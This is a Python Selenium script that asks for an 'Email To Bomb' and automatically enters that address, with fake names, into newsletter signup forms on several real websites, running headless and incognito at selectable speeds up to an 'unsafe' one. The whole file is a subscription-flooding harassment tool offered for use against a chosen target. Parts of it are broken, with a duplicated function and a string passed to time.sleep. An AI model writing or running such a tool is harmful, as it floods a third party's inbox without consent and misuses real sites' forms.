#imports
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.by import By
from datetime import datetime
import os
import time
from faker import Faker
fake = Faker()
import random
from colorama import Fore, Back, Style
from colorama import init
from termcolor import colored


init() #init for colorama and termcolor


#Chrome Options
dir_path = os.path.dirname(os.path.realpath(__file__))
chrome_path = str(dir_path + "/chromedriver")
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--incognito")
chrome_options.add_argument("--lang=en")
chrome_options.add_argument("--headless")


experimentalFlags = ['same-site-by-default-cookies@1','cookies-without-same-site-must-be-secure@1']
chromeLocalStatePrefs = { 'browser.enabled_labs_experiments' : experimentalFlags}
chrome_options.add_experimental_option('localState',chromeLocalStatePrefs)
driver = webdriver.Chrome(chrome_path, chrome_options=chrome_options)

driver.header_overrides = {
    'SameSite=None': 'Secure',
}


#Input Variables
email = input("Email To Bomb: ")
fname = input("First Name To Use (press enter for random): ")
lname = input("Last Name to Use (press enter for random): ")
speed = input("""
                Choose a Speed at which to run:
                1. (safe)                            
                2. slow (recommended)
                3. normal
                4. fast
                5. L I G H T S P E E D (unsafe)
                0. exit

                    Enter Your Choice: """)  #speed input



#driver.get("https://www.google.com")  #browser init

#checks generates fake user if left blank and generates
if (fname == ""):
    fullname = fake.name()
    a = fullname.split()
    fname = a[0]
if (lname == ""):
    fullname = fake.name()
    a = fullname.split()
    lname = a[1]
print("Email: ", email, "\nName = ",fname, " ",lname )
print("Success\n\n")


#test Module
def testmodule():
    url = 'https://www.donaldjtrump.com/media'
    driver.get(url)
    time.sleep(speed)
    driver.find_element_by_xpath("/html/body/footer/div/div[1]/div[1]/div/form/input[1]").send_keys(email)
    driver.find_element_by_xpath('/html/body/footer/div/div[1]/div[1]/div/form/input[2]').send_keys(fake.postcode())
    driver.find_element_by_xpath('/html/body/footer/div/div[1]/div[1]/div/form/input[3]').click()
    print("testmodule succeeded")
    driver.quit()

#techblog1 module
def techblog1():
    url = 'https://blog.feedspot.com/technology_blogs/'
    driver.get(url)
    #time.sleep(speed)
    driver.find_element_by_xpath("/html/body/div[1]/div/div/div/div[1]/article/div[2]/div/div[2]/div[4]/p[1]/span[5]/form/input[1]").send_keys(email)
    driver.find_element_by_xpath('/html/body/div[2]/div[2]/div/div[2]/form/input[2]').click()
    print("techblog1 module succeeded")
    driver.quit()

#xxxchurch module
def xxxchurch():
    url = 'https://www.xxxchurch.com/newsletter'
    driver.get(url)
    #time.sleep(speed)
    driver.find_element_by_xpath('/html/body/form/div/table/tbody/tr/td/table/tbody/tr/td/div[2]/table/tbody/tr/td[2]/input').send_keys(email)
    driver.find_element_by_xpath('/html/body/form/div/table/tbody/tr/td/table/tbody/tr/td/div[1]/table/tbody/tr/td[2]/input').send_keys(fname)
    driver.find_element_by_xpath('/html/body/form/div/table/tbody/tr/td/table/tbody/tr/td/div[4]/div/button').click()
    print("xxxchurch module succeeded")
    driver.quit()

#
def xxxchurch():
    url = 'https://www.xxxchurch.com/newsletter'
    driver.get(url)
    #time.sleep(speed)
    driver.find_element_by_xpath('/html/body/form/div/table/tbody/tr/td/table/tbody/tr/td/div[2]/table/tbody/tr/td[2]/input').send_keys(email)
    driver.find_element_by_xpath('/html/body/form/div/table/tbody/tr/td/table/tbody/tr/td/div[1]/table/tbody/tr/td[2]/input').send_keys(fname)
    driver.find_element_by_xpath('/html/body/form/div/table/tbody/tr/td/table/tbody/tr/td/div[4]/div/button').click()
    print("xxxchurch module succeeded")
    driver.quit()





                            #main process
testmodule()
techblog1()

print("done")